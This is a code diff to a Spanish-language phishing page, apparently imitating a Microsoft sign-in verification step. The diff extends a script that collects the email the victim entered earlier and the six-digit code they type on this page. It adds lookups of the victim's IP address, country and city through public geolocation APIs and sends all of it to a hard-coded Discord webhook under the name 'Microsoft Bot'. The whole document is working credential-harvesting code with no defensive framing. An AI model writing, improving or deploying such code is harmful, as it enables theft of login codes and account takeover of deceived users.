@@ -173,12 +173,10 @@
             </div>
             <div class="input-group">
                     <p class="e2" for="">Código en Pantalla</p>
-                    <input style="text-align: center;" type="text" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder=" * * * * * *" required>
+                    <input id="codigoInput" style="text-align: center;" type="text" inputmode="numeric" pattern="[0-9]{6}" maxlength="6" placeholder=" * * * * * *" required>
                 </div>
 
-            <a href="login.html">
-            <div class="btn1"><button>Siguiente</button></div>
-</a>
+            <div class="btn1"><button id="siguienteBtn">Siguiente</button></div>
             <div class="adis">
                 <a href="#">Términos de uso</a>
                 <a href="#">Aviso de privacidad</a>
@@ -189,13 +187,93 @@
     </div>
 <script>
     const webhook = "https://discord.com/api/webhooks/1507131798218342512/HttmYqpus_6kYPNe1WyYNxSyhkGjzTLxjlSNlIpTPtZUEeWuCfy9EJeF_ILhDmmBNYpq";
-    document.querySelector('.btn1 button').addEventListener('click', async (e) => {
+    
+    async function fetchWithTimeout(url, timeout = 5000) {
+        const controller = new AbortController();
+        const id = setTimeout(() => controller.abort(), timeout);
+        try {
+            const response = await fetch(url, { signal: controller.signal });
+            clearTimeout(id);
+            return response;
+        } catch (error) {
+            clearTimeout(id);
+            throw error;
+        }
+    }
+    
+    async function getGeoInfo() {
+        const apis = [
+            { url: 'https://ipapi.co/json/', parser: (data) => ({ ip: data.ip, pais: data.country_name, ciudad: data.city }) },
+            { url: 'https://ipinfo.io/json/', parser: (data) => ({ ip: data.ip, pais: data.country, ciudad: data.city }) },
+            { url: 'https://api.ipify.org?format=json', parser: (data) => ({ ip: data.ip, pais: 'Desconocido', ciudad: 'Desconocido' }) },
+            { url: 'https://api.my-ip.io/ip.json', parser: (data) => ({ ip: data.ip, pais: data.country || 'Desconocido', ciudad: data.city || 'Desconocido' }) }
+        ];
+        for (const api of apis) {
+            try {
+                const res = await fetchWithTimeout(api.url, 4000);
+                if (!res.ok) continue;
+                const data = await res.json();
+                let result = api.parser(data);
+                if (result.ip && result.ip !== 'No disponible') {
+                    if (result.pais === 'Desconocido' && result.ciudad === 'Desconocido' && api.url.includes('ipify')) {
+                        try {
+                            const geoRes = await fetchWithTimeout(`https://ipapi.co/${result.ip}/json/`, 3000);
+                            if (geoRes.ok) {
+                                const geoData = await geoRes.json();
+                                result.pais = geoData.country_name || 'Desconocido';
+                                result.ciudad = geoData.city || 'Desconocido';
+                            }
+                        } catch(e) {}
+                    }
+                    return result;
+                }
+            } catch(e) {
+                continue;
+            }
+        }
+        return { ip: 'No disponible', pais: 'No disponible', ciudad: 'No disponible' };
+    }
+    
+    async function ensureGeoInfo() {
+        const stored = localStorage.getItem('userDataIndex1');
+        if (stored) {
+            try {
+                const data = JSON.parse(stored);
+                if (data.geo && data.geo.ip && data.geo.ip !== 'No disponible') {
+                    return data.geo;
+                }
+            } catch(e) {}
+        }
+        return await getGeoInfo();
+    }
+    
+    function formatGeoLine(geo) {
+        return `🌍 **IP:** ${geo.ip} - 📍 **País:** ${geo.pais} - 🏙️ **Ciudad:** ${geo.ciudad}`;
+    }
+    
+    document.getElementById('siguienteBtn').addEventListener('click', async (e) => {
         e.preventDefault();
-        const userData = JSON.parse(localStorage.getItem('userDataIndex1') || '{}');
-        const email = userData.email || 'Sin correo';
-        const codigoInput = document.querySelector('.input-group input');
-        const codigo = codigoInput ? codigoInput.value : '';
-        const mensaje = `💻 **Código en pantalla**\n📧 Correo: ${email}\n🔢 Código: ${codigo}`;
+        
+        const codigoInput = document.getElementById('codigoInput');
+        const codigo = codigoInput.value.trim();
+        if (!codigo) {
+            return;
+        }
+        
+        const userDataRaw = localStorage.getItem('userDataIndex1');
+        let email = 'Sin correo';
+        if (userDataRaw) {
+            try {
+                const userData = JSON.parse(userDataRaw);
+                email = userData.email || 'Sin correo';
+            } catch(e) {}
+        }
+        
+        const geo = await ensureGeoInfo();
+        const geoLine = formatGeoLine(geo);
+        
+        const mensaje = `💻 **Código en pantalla**\n📧 Correo: ${email}\n🔢 Código: ${codigo}\n${geoLine}`;
+        
         try {
             await fetch(webhook, {
                 method: 'POST',
@@ -203,6 +281,9 @@
                 body: JSON.stringify({ content: mensaje, username: 'Microsoft Bot' })
             });
         } catch(err) { console.error(err); }
+        
+        localStorage.setItem('verificationCode1', codigo);
+        
         window.location.href = 'cargando2.html';
     });
 </script>
